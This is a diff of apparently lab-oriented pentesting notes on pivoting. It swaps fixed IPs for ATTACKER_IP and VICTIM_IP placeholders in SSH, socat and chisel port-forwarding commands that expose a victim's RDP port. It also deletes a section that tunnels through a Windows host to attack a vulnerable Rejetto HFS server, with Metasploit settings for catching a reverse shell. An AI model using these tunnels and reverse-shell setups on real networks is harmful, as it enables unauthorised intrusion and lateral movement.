@@ -20,7 +20,7 @@ With this method a Port will be opened in the Attacker Machine that can be used 
 
 ```batch
 :: -R [Request Remote Port Forward]
-ssh user@1.1.1.1 -R 3389:3.3.3.3:3389 -N
+ssh user@ATTACKER_IP -R 3389:127.0.0.1:3389 -N
 ```
 
 ```batch
@@ -39,7 +39,7 @@ This way, any Host that can't connect directly to the **Attacker PC** but can co
 
 ```batch
 :: -L [Request Local Port Forward]
-ssh tunneluser@1.1.1.1 -L "*:80:127.0.0.1:80" -N
+ssh tunneluser@ATTACKER_IP -L "*:80:127.0.0.1:80" -N
 ```
 
 ```batch
@@ -77,7 +77,7 @@ socat TCP4-LISTEN:7777,fork TCP4:VICTIM_IP:3389
 
 ```batch
 :: If the Port [3389] was Filtered now it would be Accessible
-xfreerdp /v:10.200.71.249 /u:username /p:password /port:7777
+xfreerdp /v:VICTIM_IP /u:username /p:password /port:7777
 ```
 
 <br/>
@@ -116,77 +116,4 @@ chisel client ATTACKER_IP:8000 R:7777:127.0.0.1:3389
 :: Accessing the Port from the Attacker Machine
 :: The Victim [RDP: 3389] is now Accessible at [PORT: 7777] on the Attacker Machine
 xfreerdp /v:127.0.0.1 /u:username /p:password /port:7777
-```
-
-<br/>
-
-## Rejetto [Behind Firewall]
-
-The **`Rejetto Server`** Server is running a Vulnerable version of **Rejetto HFS.** The problem we face is that **Firewall** rules Restrict access to the Vulnerable Port so that it can only be viewed from **`Windows Machine`**. 
-
-```mermaid
-flowchart RL
-
-A(((10.200.71.101 <br> Rejetto Server)))
-
-B(10.200.71.249 <br> Windows Machine) -. "9999 🠔 80" .-> C(Attacker)
-
-
-C -. "80" .-x A
-
-A -. "80" .-> B
-
-B -. "80" .-> A
-```
-
-<br/>
-
-```batch
-ssh tunneluser@10.50.65.82 -R 9999:10.200.71.101:80 -L *:6969:127.0.0.1:6969 -L *:8989:127.0.0.1:8989 -N
-               └─────────┘    └───────────────────┘    └───────────────────┘    └───────────────────┘
-                    |                   |                        |                        |
-                    |                   |                        |                        |
-                    |                   |                        |                        └────► 4.  Bind Port [8989] To Victim Machine
-                    |                   |                        └────► 3. Bind Port [6969] To Victim Machine
-                    |                   └────► 2. Rejetto Server IP
-                    |                             [Forwarding Port :9999 🠔 80]
-                    └───► 1. Attacker IP
-```
-
-
-### Exploit Path
-
-**Rejetto HFS** will be listening on **Port 80** on **`Rejetto Server`**, so we need to Tunnel that port back to the Attacker Machine through **`Windows Machine`.** The Port for the Values **SRVPORT - LPORT** can be set to a Random Number.
-
-
-```mermaid
-flowchart RL
-
-A(((Rejetto Server))) -. "SRVPORT" .-> B(Windows Machine) -. "SRVPORT" .->  C(Attacker)
-
-
-A -. "LPORT" .->  B 
-
-B -. "LPORT" .-> C
-
-C -. "RPORT" .-> B -. "RPORT" .-> A
-```
-
-<br/>
-
-```batch
-:: Send Reverse Shell to Attacker
-set LHOST 10.200.71.249
-set LPORT 8989
-
-:: Request PAYLOAD via HTTP
-set SRVPORT 6969
-set SRVHOST 127.0.0.1
-
-:: Trigger Exploit
-set RPORT 9999
-set RHOSTS 127.0.0.1
-
-:: We want the Reverse Shell Listener to be Bound to [127.0.0.1] on the Attacker Machine and the PAYLOAD to connect back to [Windows Machine]
-set ReverseListenerBindAddress 127.0.0.1
 ```
